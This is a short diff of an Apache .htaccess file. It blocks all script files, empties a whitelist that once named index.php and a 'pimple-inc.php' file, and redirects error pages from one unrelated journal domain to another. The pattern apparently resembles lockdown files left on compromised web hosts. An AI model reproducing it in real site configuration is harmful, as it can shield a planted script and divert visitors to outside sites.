@@ -2,7 +2,7 @@ Options -Indexes
 <FilesMatch "(?i)\.(php|phtml|php[0-9]|sh|pl|cgi|asp|aspx|jsp|exe|shtml)$">
 Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|pimple-inc.php)$">
+<FilesMatch "^()$">
 Allow from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
@@ -16,5 +16,5 @@ Allow from all
 
 </IfModule>
 
-ErrorDocument 403 https://djhr.uodiyala.edu.iq/
-ErrorDocument 404 https://djhr.uodiyala.edu.iq/
+ErrorDocument 403 https://ejournal.teologi-ukit.ac.id/
+ErrorDocument 404 https://ejournal.teologi-ukit.ac.id/
